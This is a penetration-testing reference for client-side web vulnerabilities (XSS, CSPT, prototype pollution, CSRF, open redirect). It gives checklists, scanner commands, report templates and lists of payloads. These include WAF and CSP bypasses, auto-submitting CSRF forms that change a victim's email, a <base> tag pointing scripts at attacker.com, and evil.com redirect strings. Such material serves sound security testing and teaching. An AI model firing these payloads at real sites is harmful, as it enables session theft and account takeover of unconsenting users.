# Client-Side Vulnerabilities Reference

## Covers: XSS (Reflected, Stored, DOM), CSPT, Prototype Pollution, CSRF, Open Redirect

---

## 1. Testing Checklist

### XSS - Reflected
1. Map all reflection points: search params, path segments, headers reflected in response
2. Inject `"><img src=x onerror=alert(1)>` in every parameter
3. Check response context: HTML body, attribute, JavaScript, URL, CSS
4. Test event handlers if inside attributes: `" onfocus=alert(1) autofocus="`
5. Check if CSP is present and evaluate strictness with csp-evaluator.withgoogle.com
6. Test encoding bypasses for each context

### XSS - Stored
1. Inject payloads in all persistent fields: profile name, bio, comments, file names, metadata
2. Check where stored data is rendered (admin panels, email notifications, PDF exports, logs)
3. Test markdown/rich text editors for HTML injection
4. Upload SVG files with embedded JavaScript
5. Test file name XSS: upload file named `"><img src=x onerror=alert(1)>.jpg`

### XSS - DOM-Based
1. Check JavaScript sinks: `innerHTML`, `document.write`, `eval`, `location`, `$.html()`
2. Check sources: `location.hash`, `location.search`, `document.referrer`, `postMessage`
3. Use browser DevTools to trace data flow from source to sink
4. Search JS files for patterns: `\.innerHTML\s*=`, `document\.write\(`, `eval\(`
5. Test `postMessage` handlers: check for missing origin validation

### Client-Side Path Traversal (CSPT)
1. Identify API calls where the path includes user-controllable input
2. Test: if `/api/users/USERINPUT/profile` -> try `../admin/config`
3. Look for fetch/XHR calls that construct URLs from DOM values
4. Check if traversal in the path reaches different API endpoints

### Prototype Pollution
1. Search JS for deep merge / extend functions: `merge(`, `extend(`, `defaultsDeep(`
2. Test URL params: `?__proto__[test]=polluted` then check `({}).test` in console
3. Test JSON body: `{"__proto__":{"test":"polluted"}}`
4. Also try `constructor.prototype` as alternative to `__proto__`
5. Find gadgets: if `polluted` property is used in `innerHTML`, `src`, `href` -> XSS

### CSRF
1. Check for anti-CSRF tokens on state-changing requests
2. Test token removal: delete the token parameter entirely
3. Test token reuse: use same token across sessions
4. Test token from another user's session
5. Check SameSite cookie attribute (None/Lax/Strict)
6. Test Content-Type switching: JSON -> form-encoded (may bypass framework CSRF protection)
7. Check CORS configuration for overly permissive origins

### Open Redirect
1. Test all redirect parameters: `url=`, `next=`, `return=`, `redirect=`, `redir=`, `dest=`
2. Test on login, logout, OAuth callback, email verification flows
3. Test bypass variants if basic payloads are blocked

---

## 2. Tool Commands

### XSS
```bash
# dalfox - automated XSS scanner
dalfox url "https://target.com/search?q=test" --skip-bav

# dalfox with custom payload
dalfox url "https://target.com/search?q=test" -p q --custom-payload xss-payloads.txt

# kxss - quick reflection check
echo "https://target.com/search?q=test" | kxss

# DOM XSS - find sinks in JS files
# Extract JS endpoints first
katana -u https://target.com -jc -d 3 -o js-urls.txt
# Then search for sinks
cat js-urls.txt | grep "\.js$" | while read url; do curl -s "$url"; done | grep -oP '(innerHTML|document\.write|eval|\.html\(|location\s*=)[^;]*'

# XSS polyglot fuzz with ffuf
ffuf -u "https://target.com/search?q=FUZZ" -w xss-payloads.txt -mc all -fr "FUZZ" -o xss-results.json
```

### CSRF
```bash
# Generate CSRF PoC with Burp (manual) or:
# Quick HTML PoC template generator
cat << 'CSRFPOC'
<html><body>
<form id="csrf" action="https://target.com/api/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com"/>
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
CSRFPOC
```

### Open Redirect
```bash
# ffuf with redirect payloads
ffuf -u "https://target.com/login?next=FUZZ" -w /usr/share/seclists/Fuzzing/open-redirect-payloads.txt -mc 301,302,303,307,308 -mr "evil\.com"
```

### Prototype Pollution
```bash
# ppfuzz / ppmap for automated detection
ppmap -u "https://target.com/page?__proto__[test]=polluted"

# Manual check: append to URL and check console
# ?__proto__[polluted]=1  -> then in console: ({}).polluted === "1"
# ?constructor[prototype][polluted]=1
```

---

## 3. Payloads

### XSS - HTML Context
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### XSS - Attribute Context
```
" onfocus=alert(1) autofocus="
" onmouseover=alert(1) "
' onfocus=alert(1) autofocus='
" style=animation-name:x onanimationstart=alert(1) "
```

### XSS - JavaScript Context
```
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
'-alert(1)-'
\"-alert(1)-//
```

### XSS - WAF Bypass
```
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Tag bypass
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

# No parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=throw/a]&onerror=alert(1)//>
<img src=x onerror="window['alert'](1)">

# No alert keyword
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=self['ale'+'rt'](1)>
<img src=x onerror=top[/al/.source+/ert/.source](1)>

# Encoding bypass
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href=javascript:alert(1)>click</a>
<a href=javascript:void(0)onclick=alert(1)>click</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>

# SVG
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x>

# Event handler without user interaction
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video autoplay onloadstart=alert(1)><source src=x>
```

### XSS - CSP Bypass
```
# If script-src includes 'unsafe-inline'
<script>alert(1)</script>

# If CDN is allowed (e.g., cdnjs.cloudflare.com)
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>

# JSONP endpoints on allowed domains
<script src="https://allowed-domain.com/jsonp?callback=alert(1)//"></script>

# base-uri not set -> inject <base> to control relative script loads
<base href="https://attacker.com/">

# If 'strict-dynamic' is used with nonce but you control a script block
# Inject into an existing nonced script's context
```

### CSRF Payloads
```html
<!-- Standard form POST -->
<form action="https://target.com/api/change-email" method="POST">
<input name="email" value="evil@attacker.com"/>
<input type="submit"/>
</form>
<script>document.forms[0].submit()</script>

<!-- JSON body via form (Content-Type bypass) -->
<form action="https://target.com/api/endpoint" method="POST" enctype="text/plain">
<input name='{"email":"evil@attacker.com","ignore":"' value='"}' />
</form>

<!-- Using fetch with no-cors (limited but sometimes works) -->
<script>
fetch('https://target.com/api/endpoint', {method:'POST', mode:'no-cors', credentials:'include',
headers:{'Content-Type':'text/plain'}, body:'email=evil@attacker.com'});
</script>
```

### Open Redirect
```
https://evil.com
//evil.com
/\evil.com
/\/evil.com
/%09/evil.com
/%5cevil.com
//evil.com/%2f..
https://target.com@evil.com
https://target.com.evil.com
javascript:alert(1)//
///evil.com
////evil.com
https:evil.com
http:evil.com
//evil%00.com
///evil.com/%2f%2e%2e
/redirect?url=https%3A%2F%2Fevil.com
```

---

## 4. Bypass Techniques

### XSS Filter Bypass
- **Tag blacklist**: Use obscure tags: `<details>`, `<marquee>`, `<video>`, `<audio>`, `<math>`, `<xmp>`
- **Event handler blacklist**: `onanimationstart`, `ontransitionend`, `onpointerover`, `onfocusin`
- **Keyword blacklist**: Unicode escapes in JS `\u0061lert(1)`, template literals, constructor chains
- **Length limit**: Short payloads `<svg/onload=alert(1)>` (28 chars), or split across multiple injection points
- **HTML encoding in attributes**: `&#x61;lert(1)` inside `href="javascript:..."`
- **Mutation XSS (mXSS)**: Abuse DOMPurify/sanitizer parsing: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`

### CSRF Protection Bypass
- Remove token entirely (check if server validates its absence)
- Change POST to GET (some frameworks only check CSRF on POST)
- Switch Content-Type from JSON to `application/x-www-form-urlencoded`
- Use `<img>` / `<link>` tags for GET-based state changes
- Subdomain CORS/cookie scope issues
- Token fixation: set known CSRF token via cookie injection

### Open Redirect Filter Bypass
- Protocol-relative: `//evil.com`
- Backslash: `/\evil.com` (browsers normalize to `//evil.com`)
- URL encoding: `%2f%2fevil.com`
- Subdomain matching bypass: `target.com.evil.com`
- Userinfo: `target.com@evil.com`
- Tab/newline chars: `java%0ascript:alert(1)`
- Null byte: `https://evil.com%00.target.com`

---

## 5. Impact Escalation

### XSS
- Steal session cookies (if no HttpOnly): `document.cookie`
- Steal tokens from localStorage/sessionStorage
- Perform actions as victim (password change, email change, fund transfer)
- Capture keystrokes / form data
- Redirect to phishing page
- Chain with CSRF: XSS bypasses all CSRF protections
- Steal OAuth tokens / API keys from the page
- If admin XSS: achieve full account takeover of admin -> RCE via admin features

### CSRF
- Target critical actions: password change, email change, API key generation
- Chain with self-XSS to make it exploitable
- Target admin actions: add new admin user, change configs

### Open Redirect
- Chain with OAuth: steal auth codes via redirect_uri manipulation
- Use in phishing campaigns (trusted domain in URL bar)
- Chain with SSRF: redirect internal requests to attacker server
- Bypass allowlist-based SSRF filters

---

## 6. Chain Opportunities

| Found This | Look For |
|---|---|
| Reflected XSS | Upgrade via CSRF chain, steal admin session, access internal pages |
| Stored XSS | Admin panel blind XSS, email notification XSS |
| DOM XSS | Prototype pollution gadgets, postMessage issues |
| CSRF | Self-XSS becomes exploitable, chain multiple CSRFs for complex attacks |
| Open Redirect | OAuth token theft, SSO bypass, SSRF bypass, phishing |
| Prototype Pollution | XSS gadgets (search for innerHTML/src/href usage of polluted props) |
| CSPT | CSRF bypass (traversal to endpoints without CSRF checks), data exfil |

---

## 7. Common False Positives

- **XSS**: Payload reflected but inside a `<textarea>`, `<code>`, or properly escaped HTML context
- **XSS**: Payload reflected in HTTP response but page uses CSP that blocks execution (still report, but note CSP)
- **XSS**: innerHTML assignment but the value is properly sanitized by DOMPurify
- **CSRF**: State-changing action requires re-authentication or confirmation step
- **CSRF**: SameSite=Lax cookies on POST request (only exploitable via top-level GET navigation)
- **Open Redirect**: Redirect goes to a relative path that can't be controlled to leave the domain
- **Prototype Pollution**: Polluted property exists but no gadget chain to achieve impact

---

## 8. Report Snippets

### Stored XSS
> The `[field]` on `[endpoint]` stores user input that is rendered without sanitization in `[victim page]`. An attacker can inject JavaScript that executes in the browser of any user viewing the affected page. This enables session hijacking, account takeover, and data theft for all affected users, including administrators. The stored nature means the payload persists and can affect many users without further attacker interaction.

### Reflected XSS
> The `[parameter]` in `[endpoint]` is reflected in the response without adequate encoding. By crafting a malicious URL, an attacker can execute arbitrary JavaScript in a victim's browser session. Combined with social engineering or placement on a high-traffic page, this enables session theft and account takeover.

### CSRF
> The `[endpoint]` performs `[action]` without verifying a CSRF token or other anti-forgery mechanism. An attacker can host a malicious page that automatically submits a forged request to this endpoint when visited by an authenticated user, allowing the attacker to `[impact: change email/password/etc]` without the victim's knowledge.

### Open Redirect
> The `[parameter]` in `[endpoint]` allows redirection to arbitrary external domains. This can be abused for credential phishing using the trusted domain name, and more critically, can be chained with the OAuth flow to steal authorization codes by manipulating the redirect_uri parameter.
